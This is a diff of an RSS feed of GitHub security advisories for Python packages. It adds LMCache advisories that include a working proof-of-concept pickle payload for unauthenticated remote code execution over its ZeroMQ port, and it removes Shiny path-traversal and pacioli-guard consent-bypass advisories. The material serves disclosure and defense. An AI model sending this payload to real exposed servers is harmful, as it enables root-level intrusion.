@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/pip.rss</id>
     <title>Security Advisory for Python packages hosted at PyPI.org</title>
-    <updated>2026-10-16T19:48:38.134Z</updated>
+    <updated>2026-10-16T22:13:29.506Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
     <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
@@ -11,6 +11,136 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[lmcache] Duplicate Advisory: Remote code execution via unsafe deserialization in multiprocess mode transport]]></title>
+        <id>https://github.com/advisories/GHSA-vv44-hjm2-qw2f</id>
+        <link href="https://github.com/advisories/GHSA-vv44-hjm2-qw2f"/>
+        <updated>2026-10-16T20:08:51.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
+<p>This advisory has been withdrawn because it is a duplicate of&nbsp;GHSA-w5f2-9q9c-ff4h. This link is maintained to preserve external references.</p>
+<h2 id="original-description">Original Description</h2>
+<p>LMCache multiprocess mode, also called distributed mode, opens an unauthenticated ZeroMQ ROUTER so worker processes can register and share KV cache blocks. Messages on that socket are msgpack. Extension code 1 is passed to DeviceIPCWrapper.Deserialize, which calls pickle.loads, while the server is still decoding request arguments and before the handler runs. A single unauthenticated ZMQ DEALER message to the transport port (default 5555) therefore executes code as the user the LMCache process runs as. Official container images run that process as root. The transport binds to localhost unless the operator sets a routable address with --host, which is how multi-node deployments let peers connect.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-105192">https://nvd.nist.gov/vuln/detail/CVE-2026-105192</a></li>
+<li><a href="https://github.com/LMCache/LMCache">https://github.com/LMCache/LMCache</a></li>
+<li><a href="https://github.com/LMCache/LMCache/blob/v0.3.9/lmcache/v1/multiprocess/custom_types.py">https://github.com/LMCache/LMCache/blob/v0.3.9/lmcache/v1/multiprocess/custom_types.py</a></li>
+<li><a href="https://github.com/LMCache/LMCache/blob/v0.5.5/lmcache/v1/platform/base/ipc_wrapper.py">https://github.com/LMCache/LMCache/blob/v0.5.5/lmcache/v1/platform/base/ipc_wrapper.py</a></li>
+<li><a href="https://pypi.org/project/lmcache">https://pypi.org/project/lmcache</a></li>
+<li><a href="https://github.com/advisories/GHSA-vv44-hjm2-qw2f">https://github.com/advisories/GHSA-vv44-hjm2-qw2f</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-vv44-hjm2-qw2f</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-10-07T12:31:58.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[lmcache] LMCache: Remote code execution via unsafe deserialization in multiprocess mode transport]]></title>
+        <id>https://github.com/advisories/GHSA-w5f2-9q9c-ff4h</id>
+        <link href="https://github.com/advisories/GHSA-w5f2-9q9c-ff4h"/>
+        <updated>2026-10-16T20:09:11.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>LMCache is vulnerable to Unauthenticated Remote Code Execution via Pickle Deserialization on the Multiprocess ZMQ Transport</p>
+<h3 id="details">Details</h3>
+<p>LMCache multiprocess mode, also called distributed mode, opens an unauthenticated ZeroMQ ROUTER so worker processes can register and share KV cache blocks. The intended clients are sibling LMCache processes. There is no CURVE, ZAP, password, or message authentication on that socket. LMCache used only inside a vLLM process does not open this port. The transport binds to localhost unless the operator sets a routable address with --host, which is how multi-node deployments let peers connect. The 9.8 score is for that routable configuration. A stock single-host install that leaves the default bind is not reachable from other machines.</p>
+<p>Messages on the socket are msgpack. Extension code 1 is registered for DeviceIPCWrapper and is passed to DeviceIPCWrapper.Deserialize in lmcache/v1/platform/base/ipc_wrapper.py, which calls pickle.loads. That hook runs from ext_hook in lmcache/v1/multiprocess/custom_types.py while the server is still decoding REGISTER_KV_CACHE arguments, before the handler runs. A single unauthenticated ZMQ DEALER message to the transport port (default 5555) therefore executes code as the user the LMCache process runs as. Official container images run that process as root.</p>
+<p>The decode path shipped in v0.3.9. It is still present in the latest PyPI release, v0.5.5, in the v0.5.6 release candidates through v0.5.6rc3, and on the dev branch as of 2026-10-07. No fixed version has been published.</p>
+<h3 id="proof-of-concept">Proof of concept</h3>
+<p>Step 1 - Start multiprocess mode bound to a routable address</p>
+<p>This is the documented multi-node setting. The ZMQ transport listens on port 5555.</p>
+<pre><code>   python -m lmcache.v1.multiprocess.http_server \
+    --http-host 127.0.0.1 --http-port 8080 \
+    --host 0.0.0.0 --port 5555 \
+    --l1-size-gb 0.25 --eviction-policy LRU \
+    --hash-algorithm blake3 --instance-id mp-node-01
+</code></pre>
+<p>Step 2 - Build a REGISTER_KV_CACHE frame whose cache slot is a pickle</p>
+<p>Payload slot 1 is a msgpack extension with code 1. The server unpickles that body while it is still decoding arguments. The command writes id to /tmp/zmq_pwn.</p>
+<pre><code>import os
+import pickle
+import msgspec
+import zmq
+
+class EvilPayload:
+    def __init__(self, cmd):
+        self.cmd = cmd
+    def __reduce__(self):
+        return (os.system, (self.cmd,))
+
+evil_pickle = pickle.dumps(EvilPayload("id &gt; /tmp/zmq_pwn 2&gt;&amp;1"))
+
+REGISTER_KV_CACHE = 1
+EXT_CODE = 1
+NUM_PAYLOADS = 7
+KVCACHE_INDEX = 1
+
+b_uid = msgspec.msgpack.encode(0)
+b_type = msgspec.msgpack.encode(REGISTER_KV_CACHE)
+payloads = [msgspec.msgpack.encode(None)] * NUM_PAYLOADS
+payloads[0] = msgspec.msgpack.encode(0)
+payloads[KVCACHE_INDEX] = msgspec.msgpack.encode(
+    [msgspec.msgpack.Ext(EXT_CODE, evil_pickle)]
+)
+frames = [b_uid, b_type, *payloads]
+</code></pre>
+<p>Step 3 - Send the frame</p>
+<pre><code>ctx = zmq.Context()
+s = ctx.socket(zmq.DEALER)
+s.connect("tcp://127.0.0.1:5555")
+s.send_multipart(frames)
+</code></pre>
+<p>The pickle runs during argument decode. The server then logs a type error for REGISTER_KV_CACHE because the handler expected a DeviceIPCWrapper and received the return value of os.system. That error is after the command has already run.</p>
+<p>Step 4 - Confirm the command ran as the LMCache user</p>
+<pre><code>cat /tmp/zmq_pwn
+</code></pre>
+<p>Expected output on an official image, where the process runs as root:</p>
+<pre><code>uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>LMCache's multiprocess (MP) mode uses a ZeroMQ transport (port 5555 by default) that does not require authentication. Device IPC descriptors received on this transport were deserialized with <code>pickle.loads</code>. An attacker who can reach the transport port can send a single crafted message and execute arbitrary code with the privileges of the LMCache process.</p>
+<p>By default the transport binds to localhost, and single-process (in-process) mode does not open the port. Deployments are exposed when the transport binds a routable address, as multi-node setups do. The project's example Kubernetes deployment bound all interfaces, and official container images ran as root, so deployments based on them should be treated as exposed.</p>
+<p>Affected: 0.3.9 through 0.5.5, the 0.5.6 release candidates, and <code>dev</code> branch builds before PR #5644.</p>
+<h3 id="patches">Patches</h3>
+<p>Fixed in <strong>0.5.6</strong>. Pickle has been replaced with versioned, typed MessagePack descriptors that are validated before use; the device wrapper type is selected from a fixed local allowlist, and there is no pickle fallback. Both the ZeroMQ and gRPC transport paths are covered.</p>
+<p>The wire format has changed: upgrade all workers and servers together.</p>
+<p>0.5.6 also binds the example Kubernetes deployment to localhost (PR #5684) and runs official images as a non-root user (PR #5685).</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>Until you can upgrade:</p>
+<ul>
+<li>Do not bind the transport to a routable address; keep it on localhost or a trusted cluster network.</li>
+<li>Restrict access to the transport port (5555 by default) with firewall rules or network policies.</li>
+<li>Run LMCache as a non-root user (build from the provided Dockerfile if needed).</li>
+</ul>
+<p>If the transport port was ever reachable from an untrusted network, treat the host as potentially compromised: review connections to the port, check for unexpected processes or outbound connections from the LMCache process, rotate reachable credentials, and redeploy from clean images.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/LMCache/LMCache/security/advisories/GHSA-w5f2-9q9c-ff4h">https://github.com/LMCache/LMCache/security/advisories/GHSA-w5f2-9q9c-ff4h</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-105192">https://nvd.nist.gov/vuln/detail/CVE-2026-105192</a></li>
+<li><a href="https://github.com/LMCache/LMCache/pull/5644">https://github.com/LMCache/LMCache/pull/5644</a></li>
+<li><a href="https://github.com/LMCache/LMCache/pull/5684">https://github.com/LMCache/LMCache/pull/5684</a></li>
+<li><a href="https://github.com/LMCache/LMCache/pull/5685">https://github.com/LMCache/LMCache/pull/5685</a></li>
+<li><a href="https://github.com/LMCache/LMCache/commit/160b6dec469edb765efd1fad42aca5a438b08bb5">https://github.com/LMCache/LMCache/commit/160b6dec469edb765efd1fad42aca5a438b08bb5</a></li>
+<li><a href="https://github.com/LMCache/LMCache/commit/62f74c417dfe1ba56761733fd25dc8209a192f20">https://github.com/LMCache/LMCache/commit/62f74c417dfe1ba56761733fd25dc8209a192f20</a></li>
+<li><a href="https://github.com/LMCache/LMCache/commit/767c7e367bbdc357c445cf7bd2ed259cff8d5865">https://github.com/LMCache/LMCache/commit/767c7e367bbdc357c445cf7bd2ed259cff8d5865</a></li>
+<li><a href="https://blog.lmcache.ai/en/2026/10/13/an-update-on-cve-2026-105192">https://blog.lmcache.ai/en/2026/10/13/an-update-on-cve-2026-105192</a></li>
+<li><a href="https://github.com/LMCache/LMCache/blob/v0.3.9/lmcache/v1/multiprocess/custom_types.py">https://github.com/LMCache/LMCache/blob/v0.3.9/lmcache/v1/multiprocess/custom_types.py</a></li>
+<li><a href="https://github.com/LMCache/LMCache/blob/v0.5.5/lmcache/v1/platform/base/ipc_wrapper.py">https://github.com/LMCache/LMCache/blob/v0.5.5/lmcache/v1/platform/base/ipc_wrapper.py</a></li>
+<li><a href="https://research.jfrog.com/vulnerabilities/lmcache-is-vulnerable-to-unauthenticated-remote-code-execution-via-pickle-deserialization-on-the-multiprocess-zmq-transport-cve-2026-105192-jfsa-2026-001694382">https://research.jfrog.com/vulnerabilities/lmcache-is-vulnerable-to-unauthenticated-remote-code-execution-via-pickle-deserialization-on-the-multiprocess-zmq-transport-cve-2026-105192-jfsa-2026-001694382</a></li>
+<li><a href="https://github.com/advisories/GHSA-w5f2-9q9c-ff4h">https://github.com/advisories/GHSA-w5f2-9q9c-ff4h</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-w5f2-9q9c-ff4h</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-10-16T20:08:44.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[claude-agent-sdk] Claude Agent SDK: Argument Injection via resume Option Allows Arbitrary Command Execution]]></title>
         <id>https://github.com/advisories/GHSA-h4mw-j7qp-8mwm</id>
@@ -939,110 +1069,5 @@ a.notify(body="x")
         </author>
         <category label="severity" term="LOW"/>
         <published>2026-10-14T18:38:05.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[shiny] Shiny for Python has path traversal in bookmark restore]]></title>
-        <id>https://github.com/advisories/GHSA-47c3-hpmg-7j6p</id>
-        <link href="https://github.com/advisories/GHSA-47c3-hpmg-7j6p"/>
-        <updated>2026-10-09T20:56:38.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p>Shiny for Python's bookmark-restore path accepted a client-supplied <code>_state_id_</code>
-query-string value and joined it into the server-side bookmark directory
-(<code>&lt;cwd&gt;/shiny_bookmarks/&lt;id&gt;</code>) without validating it. A value containing <code>..</code>
-path segments, or an absolute path, could therefore cause the server to open and
-parse <code>input.json</code> and <code>values.json</code> from a directory outside the bookmark store.</p>
-<p>On a default application the restore was attempted whenever the client supplied a
-URL query string — including when bookmarking was disabled
-(<code>bookmark_store="disable"</code>) — so no opt-in configuration was required. For such
-applications the impact is an unauthenticated, server-side probe for the
-existence and JSON-validity of attacker-chosen paths, constrained to those two
-file names.</p>
-<p>Applications configured with <code>bookmark_store="server"</code> <strong>and</strong> using
-<code>ui.input_file()</code> are affected more seriously. The file-input restore handler
-copies files out of the restore directory, so the contents of an
-attacker-selected file name within an attacker-selected directory could be read
-into the application.</p>
-<h3 id="affected-versions">Affected versions</h3>
-<p>1.4.0 through 1.6.3. Bookmarking was introduced in 1.4.0; earlier releases do
-not contain the affected code path and are not affected.</p>
-<h3 id="patches">Patches</h3>
-<p>Fixed in <strong>1.6.4</strong>. Upgrade with:</p>
-<pre><code>pip install --upgrade shiny
-</code></pre>
-<p>The fix validates bookmark IDs against an allowlist — a single path segment
-matching <code>[A-Za-z0-9_-]+</code>, which cannot express a path separator, a <code>..</code> parent
-reference, or an absolute path — before the ID is used to build a filesystem
-path. Bookmark IDs generated by Shiny are unaffected by this restriction.
-Restore is additionally gated on the application's <code>bookmark_store</code> setting at a
-single point, so it no longer runs when bookmarking is disabled, and the on-disk
-restore path is honored only under <code>bookmark_store="server"</code>.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>There is no configuration change that mitigates this on an affected version:
-the restore path ran even with <code>bookmark_store="disable"</code>. Deployments that
-cannot upgrade immediately can strip the <code>_state_id_</code> parameter from incoming
-query strings at a reverse proxy or load balancer, which prevents the affected
-code path from being reached.</p>
-<h3 id="credits">Credits</h3>
-<p>Reported by <a href="https://github.com/0xRenSec">@0xRenSec</a>.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/posit-dev/py-shiny/security/advisories/GHSA-47c3-hpmg-7j6p">https://github.com/posit-dev/py-shiny/security/advisories/GHSA-47c3-hpmg-7j6p</a></li>
-<li><a href="https://github.com/posit-dev/py-shiny/commit/1d8ecb46cbc9621b7dc8812111d26692e086b376">https://github.com/posit-dev/py-shiny/commit/1d8ecb46cbc9621b7dc8812111d26692e086b376</a></li>
-<li><a href="https://github.com/posit-dev/py-shiny/releases/tag/v1.6.4">https://github.com/posit-dev/py-shiny/releases/tag/v1.6.4</a></li>
-<li><a href="https://github.com/advisories/GHSA-47c3-hpmg-7j6p">https://github.com/advisories/GHSA-47c3-hpmg-7j6p</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-47c3-hpmg-7j6p</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-10-09T20:56:37.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[pacioli-guard] pacioli: A submit consent marker licensed cancellation of caller-named pre-existing documents]]></title>
-        <id>https://github.com/advisories/GHSA-3hj7-6vmj-h8v4</id>
-        <link href="https://github.com/advisories/GHSA-3hj7-6vmj-h8v4"/>
-        <updated>2026-10-09T20:42:53.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p><code>pacioli-guard</code>'s document-layer consent gate requires a human-minted, single-use, document-bound and <strong>act-bound</strong> marker before a credential carrying <code>API Key Scope.require_consent</code> may submit or cancel a document. Because ERPNext performs further document writes as a consequence of a governed act, nested acts are allowed to "ride" the consent established by the enclosing act instead of needing a marker of their own.</p>
-<p>The ride predicate returned <code>true</code> for <strong>every</strong> cancel, regardless of which act the enclosing marker authorised. Riding never reaches <code>consent_verdict</code>, which is where the marker-to-act binding is enforced. The result: any <code>Document.cancel()</code> performed inside an act that had established consent reached <code>docstatus = 2</code> with no marker, no act-binding check, no single-use spend, and <strong>no denial audit row</strong>.</p>
-<p>This is reachable with the exact grant an operator is documented to give the broker, and the cancelled document's identity is caller-controlled:</p>
-<ul>
-<li><code>Sales Invoice.on_submit</code> (<code>sales_invoice.py:507</code>) calls <code>process_asset_depreciation()</code> unconditionally, reaching <code>depreciate_asset_on_sale</code> (<code>:1508-1516</code>).</li>
-<li>That iterates the invoice's item rows and calls <code>frappe.get_doc("Asset", d.asset)</code>. <code>Sales Invoice Item.asset</code> is a plain writable <code>Link</code> with no <code>read_only</code> and no <code>fetch_from</code>, so the caller supplies it in the request body. The validation that would constrain it sits behind <code>if d.is_fixed_asset:</code> (<code>:428-429</code>), a server-set field.</li>
-<li>The chain reaches <code>depreciation.py:481</code> and then <code>asset_depreciation_schedule.py:215-217</code>, which calls <code>current_schedule.cancel()</code> on a <code>docstatus == 1</code>, submittable <code>Asset Depreciation Schedule</code> <strong>through the document lifecycle</strong> (only <code>should_not_cancel_depreciation_entries</code> is set, not <code>ignore_validate</code>, so <code>before_cancel</code> does fire and the ride is what admitted it).</li>
-</ul>
-<p>So one marker authorising <code>submit Sales Invoice X</code> cancelled a submitted document the human was never shown and never approved. Cancelling such a document reverses its ledger effect.</p>
-<p>The same shape exists behind wider grants, for example <code>Unreconcile Payment.on_submit</code> (<code>unreconcile_payment.py:59-64</code>), which walks a child table the caller fills and reaches <code>accounts/utils.py:857</code>/<code>:859</code> <code>gain_loss_je.cancel()</code> on submitted Journal Entries.</p>
-<h3 id="who-is-affected">Who is affected</h3>
-<p>Only sites that had opted into consent gating: a credential must hold an <code>API Key Scope</code> with <code>require_consent</code> set. <code>pacioli-guard</code> is inert for principals without such a grant, and the credential-scoping floor (<code>auth_hooks</code>) is unaffected by this issue.</p>
-<p>The document-layer consent gate was first published in 0.9.6, which is the only released version in the affected range.</p>
-<h3 id="patches">Patches</h3>
-<p>Fixed in <strong>0.10.0</strong>. The ride now discriminates on the <strong>enclosing act</strong>: an undo may cascade into further undos, but a submit may not cascade into the cancellation of a document that already has a name, because that is an act a human could have been asked to approve. The custody stamp carries the act it was established for rather than a bare boolean, which is the state the vulnerable code lacked.</p>
-<p><strong>Upgrading changes behavior.</strong> Any ERPNext flow where a submit cascades into a lifecycle cancel now requires a consent marker for that cancel as well as for the act itself. In ERPNext v16 that includes asset sale, partial-quantity asset sale, a credit note against an asset sale, Asset Repair capitalization, Asset Shift Allocation, Asset Value Adjustment, and <code>Unreconcile Payment</code>. To make that possible, the <code>X-Pacioli-Consent</code> header now accepts several markers separated by whitespace or commas; each remains bound to one document and one act, requires a different minter, and is spent exactly once.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>On 0.9.6, remove <code>require_consent</code> from affected grants and rely on the credential-scoping floor alone, or scope governed credentials so they cannot submit documents whose controllers cancel other documents (for ERPNext slice-one, <code>Sales Invoice</code> with a populated item-row <code>asset</code> link is the known path). Neither is a substitute for upgrading.</p>
-<h3 id="residual-stated">Residual, stated</h3>
-<p>Under a governed <strong>cancel</strong>, a cascaded cancel of a pre-existing document still rides. That is load-bearing for undo (an ordinary invoice cancel makes ERPNext cancel the credit/debit notes and journals it generated, via <code>accounts_controller.py:2001-2005</code>) and cannot be narrowed without a signal that a cascaded cancel is a consequence of the enclosing document specifically. That justification does not describe everything the residual admits: at least one instance is caller-steered in the same shape as the issue fixed here, <code>Asset Repair.on_cancel</code> (<code>asset_repair.py:215-222</code>), which cancels a <code>Serial and Batch Bundle</code> named by a Link the caller fills in a child table. <code>pacioli-guard</code> also does not see writes that set <code>flags.ignore_validate</code> or that skip the document lifecycle entirely (raw SQL, <code>db_update</code>/<code>db_set</code> field writes); those residuals are published in the project's own documentation and are unchanged by this advisory.</p>
-<h3 id="credit">Credit</h3>
-<p>Found by an internal adversarial review on 2026-07-28 that traced the predicate against frappe 16.28.0 and ERPNext v16 source rather than the project's own documentation. The prior code comment asserted that no such lever was known; that assertion had been written without the corresponding source sweep.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/john-broadway/pacioli/security/advisories/GHSA-3hj7-6vmj-h8v4">https://github.com/john-broadway/pacioli/security/advisories/GHSA-3hj7-6vmj-h8v4</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-107841">https://nvd.nist.gov/vuln/detail/CVE-2026-107841</a></li>
-<li><a href="https://github.com/john-broadway/pacioli/commit/f3c7219f5dde6050bd7921e0ac55afd02771250c">https://github.com/john-broadway/pacioli/commit/f3c7219f5dde6050bd7921e0ac55afd02771250c</a></li>
-<li><a href="https://github.com/john-broadway/pacioli/releases/tag/guard-v0.10.0">https://github.com/john-broadway/pacioli/releases/tag/guard-v0.10.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-3hj7-6vmj-h8v4">https://github.com/advisories/GHSA-3hj7-6vmj-h8v4</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-3hj7-6vmj-h8v4</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-10-09T20:42:51.000Z</published>
     </entry>
 </feed>
